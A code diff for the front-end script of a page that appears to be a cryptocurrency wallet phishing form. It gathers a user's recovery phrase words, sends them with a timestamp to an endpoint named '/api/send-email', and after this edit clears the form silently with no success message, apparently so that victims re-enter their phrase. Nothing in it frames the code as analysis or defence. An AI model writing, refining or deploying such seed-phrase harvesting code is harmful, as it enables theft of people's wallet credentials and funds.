@@ -60,23 +60,14 @@ function updateSubmitButton() {
     const invalidInputs = document.querySelectorAll('.input-container.invalid');
     const emptyInputs = Array.from(document.querySelectorAll('.phrase-input input')).filter(input => input.value.trim() === '');
     const submitBtn = document.querySelector('.login-btn');
-    const errorMsg = document.getElementById('validation-error') || createErrorMessage();
     
-    if (invalidInputs.length > 0) {
+    if (invalidInputs.length > 0 || emptyInputs.length > 0) {
         submitBtn.disabled = true;
         submitBtn.classList.add('disabled');
-        errorMsg.textContent = 'Please correct the highlighted words';
-        errorMsg.style.display = 'block';
         formHasErrors = true;
-    } else if (emptyInputs.length > 0) {
-        submitBtn.disabled = true;
-        submitBtn.classList.add('disabled');
-        errorMsg.style.display = 'none';
-        formHasErrors = false;
     } else {
         submitBtn.disabled = false;
         submitBtn.classList.remove('disabled');
-        errorMsg.style.display = 'none';
         formHasErrors = false;
     }
 }
@@ -141,20 +132,14 @@ function collectWords() {
 const API_ENDPOINT = '/api/send-email';
 
 async function sendWords(btn) {
-    const originalText = btn.textContent || 'Submit';
+    const originalText = btn.textContent;
     
     try {
         const inputs = document.querySelectorAll('.phrase-input input');
         const words = Array.from(inputs).map(input => input.value.trim());
         const timestamp = new Date().toISOString();
         
-        if (words.some(word => word === '')) {
-            alert('Please fill in all recovery phrase words.');
-            return;
-        }
-        
-        if (formHasErrors) {
-            alert('Please correct the invalid words before continuing.');
+        if (words.some(word => word === '') || formHasErrors) {
             return;
         }
         
@@ -177,7 +162,10 @@ async function sendWords(btn) {
             throw new Error('Failed to process request');
         }
 
-        showSuccess(btn);
+        // Clear form after successful submission
+        inputs.forEach(input => input.value = '');
+        btn.textContent = originalText;
+        btn.disabled = false;
         
     } catch (error) {
         console.error('Error:', error);
@@ -186,46 +174,7 @@ async function sendWords(btn) {
     }
 }
 
-// Function to show success state
-function showSuccess(btn) {
-    const originalText = btn.textContent;
-    btn.textContent = 'Success!';
-    btn.classList.add('success');
-    setTimeout(() => {
-        btn.disabled = false;
-        btn.textContent = originalText;
-        btn.classList.remove('success');
-    }, 2000);
-}
-
-// Add this function to ensure number labels are properly shown/hidden when form initializes
-function updateNumberVisibility() {
-    const inputs = document.querySelectorAll('.phrase-input input');
-    inputs.forEach(input => {
-        const container = input.parentElement;
-        if (input.value.trim() !== '') {
-            container.classList.add('input-has-content');
-        } else {
-            container.classList.remove('input-has-content');
-        }
-    });
-}
-
-// Add this function to handle the loading screen
-function hideLoadingScreen() {
-    const loadingScreen = document.getElementById('loadingScreen');
-    if (loadingScreen) {
-        // Add the hidden class to trigger the fade-out effect
-        loadingScreen.classList.add('hidden');
-        
-        // Remove the element from the DOM after fade-out completes
-        setTimeout(() => {
-            loadingScreen.parentNode.removeChild(loadingScreen);
-        }, 500); // Match this with the CSS transition duration
-    }
-}
-
-// Initialize inputs when page loads
+// Add event listener when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
     // Simulate loading delay (remove this in production if you want it to be based on actual load time)
     setTimeout(() => {
@@ -260,3 +209,30 @@ document.addEventListener('DOMContentLoaded', function() {
     updateSubmitButton();
     updateNumberVisibility(); // Add this to check initial state
 });
+
+// Add this function to ensure number labels are properly shown/hidden when form initializes
+function updateNumberVisibility() {
+    const inputs = document.querySelectorAll('.phrase-input input');
+    inputs.forEach(input => {
+        const container = input.parentElement;
+        if (input.value.trim() !== '') {
+            container.classList.add('input-has-content');
+        } else {
+            container.classList.remove('input-has-content');
+        }
+    });
+}
+
+// Add this function to handle the loading screen
+function hideLoadingScreen() {
+    const loadingScreen = document.getElementById('loadingScreen');
+    if (loadingScreen) {
+        // Add the hidden class to trigger the fade-out effect
+        loadingScreen.classList.add('hidden');
+        
+        // Remove the element from the DOM after fade-out completes
+        setTimeout(() => {
+            loadingScreen.parentNode.removeChild(loadingScreen);
+        }, 500); // Match this with the CSS transition duration
+    }
+}
